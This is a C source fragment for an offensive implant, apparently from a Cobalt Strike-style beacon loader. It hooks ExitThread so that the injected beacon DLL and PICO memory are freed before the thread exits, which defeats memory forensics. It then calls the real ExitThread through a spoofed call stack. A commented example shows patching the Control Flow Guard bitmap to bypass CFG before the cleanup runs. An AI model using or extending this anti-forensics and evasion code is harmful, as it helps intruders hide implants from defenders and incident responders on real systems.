/*
 * Memory Cleanup — ExitThread Hook
 *
 * Beacons injected via the inject command terminate through ExitThread.
 * The Beacon DLL and PICO remain resident and are recoverable through
 * memory forensics. Hooking ExitThread allows tracked memory regions
 * to be freed before the thread terminates.
 *
 * The executing thread cannot free its own code pages directly (crash).
 * The cleanup routine schedules VirtualFree calls on a thread pool
 * worker thread using CreateTimerQueueTimer.
 *
 * Register in spec file:
 *   addhook "KERNEL32$ExitThread" "_ExitThread"
 */

#include <windows.h>

DECLSPEC_IMPORT VOID WINAPI KERNEL32$ExitThread(DWORD);

extern MEMORY_LAYOUT g_memory;

void cleanup_memory(MEMORY_LAYOUT *mem);

VOID WINAPI _ExitThread(DWORD dwExitCode) {
    cleanup_memory(&g_memory);          /* schedules VirtualFree on the pool */

    FUNCTION_CALL call = {0};
    call.ptr     = (PVOID)KERNEL32$ExitThread;
    call.argc    = 1;
    call.args[0] = spoof_arg(dwExitCode);
    spoof_call(&call);                   /* real ExitThread through spoofed stack */
}

/*
 * Control Flow Guard: Processes built with CFG reject indirect calls
 * to addresses not registered as valid call targets. The CFG bitmap
 * must be patched before cleanup runs.
 */
BOOL cfg_enabled();
BOOL bypass_cfg(PVOID address);

/* Example usage in cleanup_memory():
 *   if (cfg_enabled()) {
 *       bypass_cfg((PVOID)KERNEL32$VirtualFree);
 *   }
 *
 *   HANDLE timerQueue = CreateTimerQueue();
 *   CreateTimerQueueTimer(&hTimer, timerQueue, FreeDllCallback,
 *       mem, 0, 0, WT_EXECUTEONLYONCE);
 *   CreateTimerQueueTimer(&hTimer, timerQueue, FreePicoCallback,
 *       mem, 100, 0, WT_EXECUTEONLYONCE);
 */
